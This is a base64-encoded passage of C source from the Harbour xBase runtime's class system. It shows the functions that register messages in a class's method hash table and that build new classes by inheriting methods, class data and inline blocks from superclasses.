aG9kIG9yIGRhdGEgaGlkZGVuDQogKiAgICAgICAgICAgICBIQl9PT19DTFNUUF9DVE9SICAg
ICAgICAgICAgOCA6IG1ldGhvZCBjb25zdHJ1Y3Rvcg0KICogICAgICAgICAgICAgSEJfT09f
Q0xTVFBfUkVBRE9OTFkgICAgICAgMTYgOiBkYXRhIHJlYWQgb25seQ0KICogICAgICAgICAg
ICAgSEJfT09fQ0xTVFBfU0hBUkVEICAgICAgICAgMzIgOiAobWV0aG9kIG9yKSBkYXRhIHNo
YXJlZA0KICogICAgICAgICAgICAgSEJfT09fQ0xTVFBfQ0xBU1MgICAgICAgICAgNjQgOiBt
ZXNzYWdlIGlzIHRoZSBuYW1lIG9mIGEgc3VwZXJjbGFzcw0KICogICAgICAgICAgICAgSEJf
T09fQ0xTVFBfU1VQRVIgICAgICAgICAxMjggOiBtZXNzYWdlIGlzIGhlcml0ZWQNCiAqLw0K
SEJfRlVOQyggX19DTFNBRERNU0cgKQ0Kew0KICAgVVNIT1JUIHVpQ2xhc3MgPSAoIFVTSE9S
VCApIGhiX3Bhcm5pKCAxICk7DQogICBVU0hPUlQgdWlTY29wZSA9ICggVVNIT1JUICkgKCBJ
U05VTSggNiApID8gaGJfcGFybmkoIDYgKSA6IEhCX09PX0NMU1RQX0VYUE9SVEVEICk7DQoN
CiAgIGlmKCB1aUNsYXNzICYmIHVpQ2xhc3MgPD0gc191aUNsYXNzZXMgKQ0KICAgew0KICAg
ICAgUENMQVNTICAgcENsYXNzICAgPSBzX3BDbGFzc2VzICsgKCB1aUNsYXNzIC0gMSApOw0K
ICAgICAgUEhCX0RZTlMgcE1lc3NhZ2UgPSBoYl9keW5zeW1HZXQoIGhiX3BhcmMoIDIgKSAp
Ow0KICAgICAgVVNIT1JUICAgdWlCdWNrZXQ7DQoNCiAgICAgIFVTSE9SVCAgIHdUeXBlICAg
ID0gKCBVU0hPUlQgKSBoYl9wYXJuaSggNCApOw0KICAgICAgVVNIT1JUICAgdWlBdDsNCiAg
ICAgIFBNRVRIT0QgIHBOZXdNZXRoOw0KDQogICAgICBpZiggd1R5cGUgPT0gSEJfT09fTVNH
X0lOTElORSAmJiBoYl9wYXJhbSggMywgSEJfSVRfQkxPQ0sgKSA9PSBOVUxMICkNCiAgICAg
ICAgIGhiX2VyclJUX0JBU0UoIEVHX0FSRywgMzAwMCwgTlVMTCwgIl9fQ0xTQURETVNHIiAp
Ow0KDQogICAgICBpZiggcENsYXNzLT51aU1ldGhvZHMgPiAoIHBDbGFzcy0+dWlIYXNoS2V5
ICogQlVDS0VUICogMiAvIDMgKSApDQogICAgICAgICBoYl9jbHNEaWN0UmVhbGxvYyggcENs
YXNzICk7DQoNCiAgICAgIGRvDQogICAgICB7DQogICAgICAgICB1aUF0ID0gKCBVU0hPUlQg
KSAoICggKCBoYl9jbHNfTXNnVG9OdW0oIHBNZXNzYWdlICkgKSAlIHBDbGFzcy0+dWlIYXNo
S2V5ICkgKiBCVUNLRVQgKTsNCg0KICAgICAgICAgLyogRmluZCBlaXRoZXIgdGhlIGV4aXN0
aW5nIG1lc3NhZ2Ugb3IgYW4gb3BlbiBzcG90IGZvciBhIG5ldyBtZXNzYWdlICovDQogICAg
ICAgICBmb3IoIHVpQnVja2V0ID0gMDsgdWlCdWNrZXQgPCBCVUNLRVQ7IHVpQnVja2V0Kysg
KQ0KICAgICAgICAgew0KICAgICAgICAgICAgaWYoICFwQ2xhc3MtPnBNZXRob2RzWyB1aUF0
K3VpQnVja2V0IF0ucE1lc3NhZ2UNCiAgICAgICAgICAgICAgICB8fA0KICAgICAgICAgICAg
ICAgICggcENsYXNzLT5wTWV0aG9kc1sgdWlBdCt1aUJ1Y2tldCBdLnBNZXNzYWdlID09IHBN
ZXNzYWdlICkNCiAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgYnJlYWs7DQogICAg
ICAgICB9DQoNCiAgICAgICAgIGlmKCB1aUJ1Y2tldCA+PSBCVUNLRVQgKQ0KICAgICAgICAg
ICAgaGJfY2xzRGljdFJlYWxsb2MoIHBDbGFzcyApOw0KDQogICAgICB9IHdoaWxlKCB1aUJ1
Y2tldCA+PSBCVUNLRVQgKTsNCg0KICAgICAgcE5ld01ldGggPSBwQ2xhc3MtPnBNZXRob2Rz
ICsgKCB1aUF0ICsgdWlCdWNrZXQgKTsNCg0KICAgICAgaWYoICEgcE5ld01ldGgtPnBNZXNz
YWdlICkNCiAgICAgIHsNCiAgICAgICAgIHBOZXdNZXRoLT5wTWVzc2FnZSA9IHBNZXNzYWdl
Ow0KICAgICAgICAgcENsYXNzLT51aU1ldGhvZHMrKzsgICAgICAgICAgIC8qIE9uZSBtb3Jl
IG1lc3NhZ2UgKi8NCiAgICAgIH0NCg0KDQogICAgICBwTmV3TWV0aC0+dWlTcHJDbGFzcyA9
IHVpQ2xhc3MgIDsgLyogbm93IHVzZWQgISEgKi8NCiAgICAgIHBOZXdNZXRoLT5iQ2xzRGF0
YUluaXRpYXRlZCA9IDAgOyAvKiByZXNldCBzdGF0ZSAqLw0KDQogICAgICAvKiBpbiBjYXMg
ZW9mIHJlLXVzZWQgbWVzc2FnZSAqLw0KICAgICAgaWYgKCBwTmV3TWV0aC0+cEluaXRWYWx1
ZSApDQogICAgICAgew0KICAgICAgICBoYl9pdGVtUmVsZWFzZShwTmV3TWV0aC0+cEluaXRW
YWx1ZSkgOw0KICAgICAgICBwTmV3TWV0aC0+cEluaXRWYWx1ZSA9IDAgOw0KICAgICAgIH0N
Cg0KICAgICAgc3dpdGNoKCB3VHlwZSApDQogICAgICB7DQogICAgICAgICBjYXNlIEhCX09P
X01TR19NRVRIT0Q6DQoNCiAgICAgICAgICAgIHBOZXdNZXRoLT5wRnVuY3Rpb24gPSAoIFBI
Ql9GVU5DICkgaGJfcGFybmwoIDMgKTsNCiAgICAgICAgICAgIHBOZXdNZXRoLT51aVNjb3Bl
ID0gdWlTY29wZTsNCiAgICAgICAgICAgIHBOZXdNZXRoLT51aURhdGEgPSAwOw0KICAgICAg
ICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGNhc2UgSEJfT09fTVNHX0RBVEE6DQoNCiAgICAg
ICAgICAgIHBOZXdNZXRoLT51aURhdGEgPSAoIFVTSE9SVCApIGhiX3Bhcm5sKCAzICk7DQog
ICAgICAgICAgICBwTmV3TWV0aC0+dWlTY29wZSA9IHVpU2NvcGU7DQoNCiAgICAgICAgICAg
IGlmKCBwTWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lWyAwIF0gPT0gJ18nICkNCiAgICAgICAg
ICAgICAgIHBOZXdNZXRoLT5wRnVuY3Rpb24gID0gaGJfX19tc2dTZXREYXRhOw0KICAgICAg
ICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgUEhCX0lURU0gcElu
aXQgPSBoYl9wYXJhbSggNSwgSEJfSVRfQU5ZICk7DQoNCiAgICAgICAgICAgICAgIHBOZXdN
ZXRoLT5wRnVuY3Rpb24gID0gaGJfX19tc2dHZXREYXRhOw0KDQogICAgICAgICAgICAgICBp
ZiggcEluaXQgJiYgISBIQl9JU19OSUwoIHBJbml0ICkgKSAvKiBJbml0aWFsaXplciBmb3Vu
ZCAqLw0KICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgaWYoIEhCX0lTX0FS
UkFZKCBwSW5pdCApICkNCiAgICAgICAgICAgICAgICAgICAgIHBOZXdNZXRoLT5wSW5pdFZh
bHVlID0gaGJfYXJyYXlDbG9uZSggcEluaXQgKTsNCiAgICAgICAgICAgICAgICAgIGVsc2UN
CiAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIHBOZXdNZXRoLT5w
SW5pdFZhbHVlID0gaGJfaXRlbU5ldyggTlVMTCApOw0KICAgICAgICAgICAgICAgICAgICAg
aGJfaXRlbUNvcHkoIHBOZXdNZXRoLT5wSW5pdFZhbHVlLCBwSW5pdCApOw0KICAgICAgICAg
ICAgICAgICAgfQ0KICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAg
ICAgYnJlYWs7DQoNCiAgICAgICAgIGNhc2UgSEJfT09fTVNHX0NMQVNTREFUQToNCg0KICAg
ICAgICAgICAgcE5ld01ldGgtPnVpRGF0YSAgPSAoIFVTSE9SVCApIGhiX3Bhcm5sKCAzICk7
DQogICAgICAgICAgICBwTmV3TWV0aC0+dWlEYXRhU2hhcmVkID0gcE5ld01ldGgtPnVpRGF0
YSA7DQoNCiAgICAgICAgICAgIHBOZXdNZXRoLT51aVNjb3BlID0gdWlTY29wZTsNCg0KICAg
ICAgICAgICAgaWYoICggVVNIT1JUICkgaGJfYXJyYXlMZW4oIHBDbGFzcy0+cENsYXNzRGF0
YXMgKSA8IHBOZXdNZXRoLT51aURhdGEgKQ0KICAgICAgICAgICAgICBoYl9hcnJheVNpemUo
IHBDbGFzcy0+cENsYXNzRGF0YXMsIHBOZXdNZXRoLT51aURhdGEgKTsNCg0KICAgICAgICAg
ICAgaWYoIHBNZXNzYWdlLT5wU3ltYm9sLT5zek5hbWVbIDAgXSAhPSAnXycgKQ0KICAgICAg
ICAgICAgew0KICAgICAgICAgICAgICAgUEhCX0lURU0gcEluaXQgPSBoYl9wYXJhbSggNSwg
SEJfSVRfQU5ZICk7DQoNCiAgICAgICAgICAgICAgIGlmKCBwSW5pdCAmJiAhIEhCX0lTX05J
TCggcEluaXQgKSApIC8qIEluaXRpYWxpemVyIGZvdW5kICovDQogICAgICAgICAgICAgICB7
DQogICAgICAgICAgICAgICAgICBpZiggSEJfSVNfQVJSQVkoIHBJbml0ICkgKQ0KICAgICAg
ICAgICAgICAgICAgICAgcE5ld01ldGgtPnBJbml0VmFsdWUgPSBoYl9hcnJheUNsb25lKCBw
SW5pdCApOw0KICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgew0K
ICAgICAgICAgICAgICAgICAgICAgcE5ld01ldGgtPnBJbml0VmFsdWUgPSBoYl9pdGVtTmV3
KCBOVUxMICk7DQogICAgICAgICAgICAgICAgICAgICBoYl9pdGVtQ29weSggcE5ld01ldGgt
PnBJbml0VmFsdWUsIHBJbml0ICk7DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
ICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmKCAoIHBOZXdNZXRoLT51
aVNjb3BlICYgSEJfT09fQ0xTVFBfU0hBUkVEICkgIT0gSEJfT09fQ0xTVFBfU0hBUkVEICkN
CiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgIGlmKCBwTWVzc2FnZS0+cFN5bWJvbC0+
c3pOYW1lWyAwIF0gPT0gJ18nICkNCiAgICAgICAgICAgICAgICAgIHBOZXdNZXRoLT5wRnVu
Y3Rpb24gPSBoYl9fX21zZ1NldENsc0RhdGE7DQogICAgICAgICAgICAgICBlbHNlDQogICAg
ICAgICAgICAgICAgICBwTmV3TWV0aC0+cEZ1bmN0aW9uID0gaGJfX19tc2dHZXRDbHNEYXRh
Ow0KDQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQog
ICAgICAgICAgICAgICBpZiggcE1lc3NhZ2UtPnBTeW1ib2wtPnN6TmFtZVsgMCBdID09ICdf
JyApDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgcE5ld01ldGgtPnBG
dW5jdGlvbiA9IGhiX19fbXNnU2V0U2hyRGF0YTsNCiAgICAgICAgICAgICAgICAgIHBDbGFz
cy0+dWlEYXRhc1NoYXJlZCsrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAg
IGVsc2UNCiAgICAgICAgICAgICAgICAgIHBOZXdNZXRoLT5wRnVuY3Rpb24gPSBoYl9fX21z
Z0dldFNockRhdGE7DQoNCi8qICAgICAgICAgICAgIGlmIChUUlVFKQ0KKiAgICAgICAgICAg
ICAgIHsNCiogICAgICAgICAgICAgICAgY2hhciBjVG1wWzI1NV07DQoqICAgICAgICAgICAg
ICAgIHdzcHJpbnRmKGNUbXAsICJDbGFzcyAlcywgTWVzc2FnZSAlcywgdWlkYXRhICVkXG4i
LCBwQ2xhc3MtPnN6TmFtZSwgcE1lc3NhZ2UtPnBTeW1ib2wtPnN6TmFtZSwgcE5ld01ldGgt
PnVpRGF0YSk7DQoqICAgICAgICAgICAgICAgIE1lc3NhZ2VCb3goMCxjVG1wLCJBZGRNc2cg
Q2xhc3NEYXRhIFNoYXJlZCIsMCk7DQoqICAgICAgICAgICAgICAgfQ0KKi8NCiAgICAgICAg
ICAgIH0NCg0KICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGNhc2UgSEJfT09fTVNH
X0lOTElORToNCg0KICAgICAgICAgICAgcE5ld01ldGgtPnVpRGF0YSA9ICggVVNIT1JUICkg
KCBoYl9hcnJheUxlbiggcENsYXNzLT5wSW5saW5lcyApICsgMSApOw0KICAgICAgICAgICAg
cE5ld01ldGgtPnVpU2NvcGUgPSB1aVNjb3BlOw0KICAgICAgICAgICAgaGJfYXJyYXlTaXpl
KCBwQ2xhc3MtPnBJbmxpbmVzLCBwTmV3TWV0aC0+dWlEYXRhICk7DQogICAgICAgICAgICBo
Yl9hcnJheVNldCggcENsYXNzLT5wSW5saW5lcywgcE5ld01ldGgtPnVpRGF0YSwgaGJfcGFy
YW0oIDMsIEhCX0lUX0JMT0NLICkgKTsNCiAgICAgICAgICAgIHBOZXdNZXRoLT5wRnVuY3Rp
b24gPSBoYl9fX21zZ0V2YWxJbmxpbmU7DQogICAgICAgICAgICBicmVhazsNCg0KICAgICAg
ICAgY2FzZSBIQl9PT19NU0dfVklSVFVBTDoNCg0KICAgICAgICAgICAgcE5ld01ldGgtPnBG
dW5jdGlvbiA9IGhiX19fbXNnVmlydHVhbDsNCiAgICAgICAgICAgIGJyZWFrOw0KDQogICAg
ICAgICBjYXNlIEhCX09PX01TR19TVVBFUjoNCg0KICAgICAgICAgICAgcE5ld01ldGgtPnVp
RGF0YSA9ICggVVNIT1JUICkgaGJfcGFybmwoIDMgKTsNCiAgICAgICAgICAgIHBOZXdNZXRo
LT51aVNwckNsYXNzID0gKCBVU0hPUlQgKSBoYl9wYXJubCggNSApOyAvKiBzdG9yZSB0aGUg
c3VwZXIgaGFuZGVsICovDQogICAgICAgICAgICBwTmV3TWV0aC0+dWlTY29wZSA9IHVpU2Nv
cGU7DQogICAgICAgICAgICBwTmV3TWV0aC0+cEZ1bmN0aW9uID0gaGJfX19tc2dTdXBlcjsN
CiAgICAgICAgICAgIGJyZWFrOw0KDQogICAgICAgICBjYXNlIEhCX09PX01TR19PTkVSUk9S
Og0KDQogICAgICAgICAgICBwQ2xhc3MtPnBGdW5FcnJvciA9ICggUEhCX0ZVTkMgKSBoYl9w
YXJubCggMiApOw0KICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGRlZmF1bHQ6DQoN
CiAgICAgICAgICAgIGhiX2VyckludGVybmFsKCBIQl9FSV9DTFNJTlZNRVRIT0QsIE5VTEws
ICJfX2Nsc0FkZE1zZyIsIE5VTEwgKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgfQ0K
ICAgfQ0KfQ0KDQoNCi8qDQogKiA8aENsYXNzPiA6PSBfX2Nsc05ldyggPGNDbGFzc05hbWU+
LCA8bkRhdGFzPiwgW2FoU3VwZXIsYW9TdXBlcl0gKQ0KICoNCiAqIENyZWF0ZSBhIG5ldyBj
bGFzcw0KICoNCiAqIDxjQ2xhc3NOYW1lPiBOYW1lIG9mIHRoZSBjbGFzcw0KICogPG5EYXRh
cz4gICAgIE51bWJlciBvZiBEQVRBcyBpbiB0aGUgY2xhc3MNCiAqIDxhaFN1cGVyPiAgICBP
cHRpb25hbCBoYW5kbGUocykgb2Ygc3VwZXJjbGFzcyhlcykNCiAqIDxhaFN1cGVyPiAgICBP
cHRpb25hbCBzdXBlcmNsYXNzKGVzKSBPYmplY3QgaW5zdGFuY2UNCiAqLw0KSEJfRlVOQygg
X19DTFNORVcgKQ0Kew0KICAgUENMQVNTIHBOZXdDbHM7DQogICBVU0hPUlQgdWlTaXplOw0K
DQogICBQSEJfSVRFTSBwYWhTdXBlcjsNCiAgIFVTSE9SVCBpLCB1aVN1cGVyOw0KICAgLypV
U0hPUlQgbkxlblNockRhdGFzID0gMDsqLw0KICAgVVNIT1JUIG5MZW5DbHNEYXRhcyA9IDA7
DQogICBVU0hPUlQgbkxlbklubGluZXMgPSAwOw0KICAgVVNIT1JUIG5MZW5EYXRhcyA9IDA7
DQoNCiAgIHBhaFN1cGVyID0gaGJfaXRlbVBhcmFtKCAzICk7ICAgICAgLyogUmVwbGFjZSB0
aGUgaW5pdGlhbCB1aVN1cGVyICAgKi8NCiAgIHVpU3VwZXIgID0gKCBVU0hPUlQgKSBoYl9p
dGVtU2l6ZSggcGFoU3VwZXIgKTsgLyogTnVtYmVyIG9mIFN1cGVyIGNsYXNzIHByZXNlbnQg
Ki8NCg0KICAgaWYoIHNfcENsYXNzZXMgKQ0KICAgICAgc19wQ2xhc3NlcyA9ICggUENMQVNT
ICkgaGJfeHJlYWxsb2MoIHNfcENsYXNzZXMsIHNpemVvZiggQ0xBU1MgKSAqICggc191aUNs
YXNzZXMgKyAxICkgKTsNCiAgIGVsc2UNCiAgICAgIHNfcENsYXNzZXMgPSAoIFBDTEFTUyAp
IGhiX3hncmFiKCBzaXplb2YoIENMQVNTICkgKTsNCg0KICAgcE5ld0NscyA9IHNfcENsYXNz
ZXMgKyBzX3VpQ2xhc3NlczsNCiAgIHBOZXdDbHMtPnN6TmFtZSA9ICggY2hhciAqICkgaGJf
eGdyYWIoIGhiX3BhcmNsZW4oIDEgKSArIDEgKTsNCg0KICAgbWVtc2V0KHBOZXdDbHMtPnN6
TmFtZSwgMCwgaGJfcGFyY2xlbiggMSApICsgMSk7DQoNCiAgIHN0cmNweSggcE5ld0Nscy0+
c3pOYW1lLCBoYl9wYXJjKCAxICkgKTsNCiAgIHBOZXdDbHMtPnVpRGF0YUZpcnN0ID0gMDsN
CiAgIHBOZXdDbHMtPnVpRGF0YXMgPSAwOw0KICAgcE5ld0Nscy0+dWlNZXRob2RzID0gMDsN
CiAgIHBOZXdDbHMtPnVpRGF0YXNTaGFyZWQgPSAwOw0KDQogICBpZiggdWlTdXBlciApDQog
ICB7DQogICAgICBmb3IoIGkgPSAxOyBpIDw9IHVpU3VwZXI7IGkrKyApDQogICAgICB7DQog
ICAgICAgICBQSEJfRFlOUyBwTXNnOw0KICAgICAgICAgUEhCX0lURU0gcFN1cGVyOw0KICAg
ICAgICAgUEhCX0lURU0gcENsc0FueVRtcDsNCiAgICAgICAgIFVTSE9SVCBuU3VwZXI7DQog
ICAgICAgICBVU0hPUlQgdWksIHVpQXQsIHVpTGltaXQsIHVpQ3VycmVudCA7DQogICAgICAg
ICBQQ0xBU1MgcFNwckNsczsNCiAgICAgICAgIFVTSE9SVCBuTGVuOw0KICAgICAgICAgQk9P
TCBiUmVzaXplIDsNCg0KICAgICAgICAgcFN1cGVyICA9ICBoYl9pdGVtTmV3KCBOVUxMICk7
DQogICAgICAgICBoYl9hcnJheUdldCggcGFoU3VwZXIsIGksIHBTdXBlcik7DQogICAgICAg
ICBuU3VwZXIgID0gKCBVU0hPUlQgKSBoYl9pdGVtR2V0TkwoIHBTdXBlciApOw0KICAgICAg
ICAgcFNwckNscyA9IHNfcENsYXNzZXMgKyAoIG5TdXBlciAtIDEgKTsNCiAgICAgICAgIHVp
TGltaXQgPSAoIFVTSE9SVCApICggcFNwckNscy0+dWlIYXNoS2V5ICogQlVDS0VUICk7DQoN
CiAgICAgICAgIGhiX2l0ZW1SZWxlYXNlKCBwU3VwZXIgKTsNCg0KICAgICAgICAgcE5ld0Ns
cy0+dWlEYXRhRmlyc3QgKz0gcFNwckNscy0+dWlEYXRhczsNCiAgICAgICAgIHBOZXdDbHMt
PnVpRGF0YXMgICAgICA9ICggVVNIT1JUICkgKCBwTmV3Q2xzLT51aURhdGFGaXJzdCArIGhi
X3Bhcm5pKCAyICkgKTsNCg0KICAgICAgICAgaWYoIGkgPT0gMSApIC8qIFRoaXMgaXMgdGhl
IGZpcnN0IHN1cGVyY2xhc3MgKi8NCiAgICAgICAgIHsNCiAgICAgICAgICAgIHBOZXdDbHMt
PnVpSGFzaEtleSA9IHBTcHJDbHMtPnVpSGFzaEtleTsNCg0KICAgICAgICAgICAgLyogQ0xB
U1MgREFUQSBOb3QgU2hhcmVkICggbmV3IGFycmF5LCBuZXcgdmFsdWUgKSAqLw0KICAgICAg
ICAgICAgcE5ld0Nscy0+cENsYXNzRGF0YXMgID0gaGJfYXJyYXlDbG9uZSggcFNwckNscy0+
cENsYXNzRGF0YXMgKTsNCg0KICAgICAgICAgICAgcE5ld0Nscy0+cElubGluZXMgPSBoYl9h
cnJheUNsb25lKCBwU3ByQ2xzLT5wSW5saW5lcyApOw0KDQogICAgICAgICAgICBwTmV3Q2xz
LT51aURhdGFzU2hhcmVkID0gcFNwckNscy0+dWlEYXRhc1NoYXJlZDsNCg0KICAgICAgICAg
fQ0KICAgICAgICAgZWxzZQ0KICAgICAgICAgew0KICAgICAgICAgICAgLyogT2sgYWRkIG5v
dyB0aGUgcHJldmlvdXMgbGVuIHRvIHRoZSBvZmZzZXQgKi8NCiAgICAgICAgICAgIG5MZW5D
bHNEYXRhcyAgPSAoIFVTSE9SVCApIGhiX2l0ZW1TaXplKCBwTmV3Q2xzLT5wQ2xhc3NEYXRh
cyApOw0KICAgICAgICAgICAgbkxlbklubGluZXMgICA9ICggVVNIT1JUICkgaGJfaXRlbVNp
emUoIHBOZXdDbHMtPnBJbmxpbmVzICk7DQogICAgICAgICAgICBuTGVuRGF0YXMgICAgID0g
KCBVU0hPUlQgKSBwTmV3Q2xzLT51aURhdGFzOw0KDQogICAgICAgICAgICAvKiBDbGFzc0Rh
dGFzICovDQogICAgICAgICAgICBwQ2xzQW55VG1wID0gaGJfYXJyYXlDbG9uZSggcFNwckNs
cy0+cENsYXNzRGF0YXMgKTsNCiAgICAgICAgICAgIG5MZW4gPSAoIFVTSE9SVCApIGhiX2l0
ZW1TaXplKCBwQ2xzQW55VG1wICk7DQogICAgICAgICAgICBmb3IoIHVpID0gMTsgdWkgPD0g
bkxlbjsgdWkrKyApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgUEhCX0lURU0g
cFRtcCA9IGhiX2l0ZW1OZXcoIE5VTEwgKTsNCiAgICAgICAgICAgICAgICBoYl9hcnJheUdl
dCggcENsc0FueVRtcCwgdWksIHBUbXAgKTsNCiAgICAgICAgICAgICAgICBoYl9hcnJheUFk
ZCggcE5ld0Nscy0+cENsYXNzRGF0YXMsIHBUbXAgKTsNCiAgICAgICAgICAgICAgICBoYl9p
dGVtUmVsZWFzZSggcFRtcCApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaGJfaXRl
bVJlbGVhc2UoIHBDbHNBbnlUbXAgKTsNCg0KICAgICAgICAgICAgLyogU2hhcmVkRGF0YXMg
Ki8NCiAgICAgICAgICAgIHBOZXdDbHMtPnVpRGF0YXNTaGFyZWQgKz0gcFNwckNscy0+dWlE
YXRhc1NoYXJlZDsNCg0KICAgICAgICAgICAgLyogSW5saW5lcyAqLw0KICAgICAgICAgICAg
cENsc0FueVRtcCA9IGhiX2FycmF5Q2xvbmUoIHBTcHJDbHMtPnBJbmxpbmVzICk7DQogICAg
ICAgICAgICBuTGVuID0gKCBVU0hPUlQgKSBoYl9pdGVtU2l6ZSggcENsc0FueVRtcCApOw0K
ICAgICAgICAgICAgZm9yKCB1aSA9IDE7IHVpIDw9IG5MZW47IHVpKysgKQ0KICAgICAgICAg
ICAgew0KICAgICAgICAgICAgICAgIFBIQl9JVEVNIHBUbXAgPSBoYl9pdGVtTmV3KCBOVUxM
ICk7DQogICAgICAgICAgICAgICAgaGJfYXJyYXlHZXQoIHBDbHNBbnlUbXAsIHVpLCBwVG1w
ICk7DQogICAgICAgICAgICAgICAgaGJfYXJyYXlBZGQoIHBOZXdDbHMtPnBJbmxpbmVzLCBw
VG1wICk7DQogICAgICAgICAgICAgICAgaGJfaXRlbVJlbGVhc2UoIHBUbXAgKTsNCiAgICAg
ICAgICAgIH0NCiAgICAgICAgICAgIGhiX2l0ZW1SZWxlYXNlKCBwQ2xzQW55VG1wICk7DQog
ICAgICAgICB9DQoNCg0KICAgICAgICAgLyogTm93IHdvcmtpbmcgb24gcE1ldGhvZHMgKi8N
Cg0KICAgICAgICAgaWYoIGkgPT0gMSApDQogICAgICAgICB7DQogICAgICAgICAgICB1aVNp
emUgPSAoIFVTSE9SVCApICggcE5ld0Nscy0+dWlIYXNoS2V5ICogQlVDS0VUICogc2l6ZW9m
KCBNRVRIT0QgKSApOw0KICAgICAgICAgICAgcE5ld0Nscy0+cE1ldGhvZHMgPSAoIFBNRVRI
T0QgKSBoYl94Z3JhYiggdWlTaXplICk7DQogICAgICAgICAgICBtZW1zZXQoIHBOZXdDbHMt
PnBNZXRob2RzLCAwLCB1aVNpemUgKTsNCiAgICAgICAgICAgIHBOZXdDbHMtPnBGdW5FcnJv
ciA9IHBTcHJDbHMtPnBGdW5FcnJvcjsNCiAgICAgICAgIH0NCg0KDQogICAgICAgICBiUmVz
aXplID0gKCAoIHBOZXdDbHMtPnVpTWV0aG9kcyArIHBTcHJDbHMtPnVpTWV0aG9kcyApID4g
KCBwTmV3Q2xzLT51aUhhc2hLZXkgKiBCVUNLRVQgKiAyIC8gMyApICkgOw0KICAgICAgICAg
dWlDdXJyZW50ID0gMCA7DQoNCiAgICAgICAgIGRvDQogICAgICAgICB7DQoNCiAgICAgICAg
ICBpZiggYlJlc2l6ZSApDQogICAgICAgICAgew0KICAgICAgICAgICAgLyogTm90IGVhc3kg
dG8gZGVidWcgLi4uIEkgZG9uJ3QgZmluZCBhbnkgc2FtcGxlcyB3aGVyZSB0aGlzIGNhc2Ug
YXBwZWFyICovDQogICAgICAgICAgICBoYl9jbHNEaWN0UmVhbGxvYyggcE5ld0NscyApOw0K
ICAgICAgICAgICAgYlJlc2l6ZT1GQUxTRTsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICAv
KiBXaGVuIGRvaW5nIHRoZSBldmVudHVhbCBzZWNvbmQgcGFzcyBhZnRlciBjYWxsIHRvIGhi
X2Nsc0RpY3RSZWFsbG9jICovDQogICAgICAgICAgLyogV2UgcmV2aWV3IG9ubHkgbWVzc2Fn
ZXMgbm90IGFscmVhZHkgdHJlYXRlZCAqLw0KDQogICAgICAgICAgZm9yKCB1aSA9IHVpQ3Vy
cmVudCA7IHVpIDwgdWlMaW1pdDsgdWkrKyApDQogICAgICAgICAgew0KICAgICAgICAgICAg
VVNIT1JUIHVpQnVja2V0Ow0KDQogICAgICAgICAgICBwTXNnID0gKCBQSEJfRFlOUyApIHBT
cHJDbHMtPnBNZXRob2RzWyB1aSBdLnBNZXNzYWdlOw0KDQogICAgICAgICAgICBpZiggcE1z
ZyApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICB1aUF0ID0gKCBVU0hPUlQgKSAo
ICggKCBoYl9jbHNfTXNnVG9OdW0oIHBNc2cgKSApICUgcE5ld0Nscy0+dWlIYXNoS2V5ICkg
KiBCVUNLRVQgKTsNCg0KICAgICAgICAgICAgICAgZm9yKCB1aUJ1Y2tldCA9IDA7IHVpQnVj
a2V0IDwgQlVDS0VUOyB1aUJ1Y2tldCsrICkNCiAgICAgICAgICAgICAgIHsNCg0KI2lmZGVm
IEhCX0NMU19NQVNLSElEREVOIC8qIG5vIGhpZGRlbiBtZXRob2RzIGFsbG93ZWQgYnkgdGhl
IGluaGVyaXRlbmNlLiAqLw0KICAgICAgICAgICAgICAgICAgaWYoICggcFNwckNscy0+cE1l
dGhvZHNbIHVpIF0udWlTY29wZSAmIEhCX09PX0NMU1RQX0hJRERFTiApID09IEhCX09PX0NM
U1RQX0hJRERFTiApDQogICAgICAgICAgICAgICAgICAgICBicmVhazsNCiNlbmRpZg0KDQog
ICAgICAgICAgICAgICAgICAvKiBPaywgdGhpcyBidWNrZXQgaXMgZW1wdHkgKi8NCiAgICAg
ICAgICAgICAgICAgIGlmKCBwTmV3Q2xzLT5wTWV0aG9kc1sgdWlBdCt1aUJ1Y2tldCBdLnBN
ZXNzYWdlID09IDAgKQ0KICAgICAgICAgICAgICAgICAgew0KDQogICAgICAgICAgICAgICAg
ICAgICAvKiBOb3csIHdlIGNhbiBpbmNyZW1lbnQgdGhlIG1zZyBjb3VudCAqLw0KICAgICAg
ICAgICAgICAgICAgICAgcE5ld0Nscy0+dWlNZXRob2RzKys7DQoNCiAgICAgICAgICAgICAg
ICAgICAgIGhiX3htZW1jcHkocE5ld0Nscy0+cE1ldGhvZHMgKyAoIHVpQXQrdWlCdWNrZXQg
KSwgcFNwckNscy0+cE1ldGhvZHMgKyB1aSwgc2l6ZW9mKCBNRVRIT0QgKSApOw0KDQogICAg
ICAgICAgICAgICAgICAgICBpZigNCiAgICAgICAgICAgICAgICAgICAgICAgICBwTmV3Q2xz
LT5wTWV0aG9kc1sgdWlBdCt1aUJ1Y2tldCBdLnBGdW5jdGlvbiA9PSAgaGJfX19tc2dTZXRD
bHNEYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgfHwNCiAgICAgICAgICAgICAgICAg
ICAgICAgICBwTmV3Q2xzLT5wTWV0aG9kc1sgdWlBdCt1aUJ1Y2tldCBdLnBGdW5jdGlvbiA9
PSAgaGJfX19tc2dHZXRDbHNEYXRhDQogICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAg
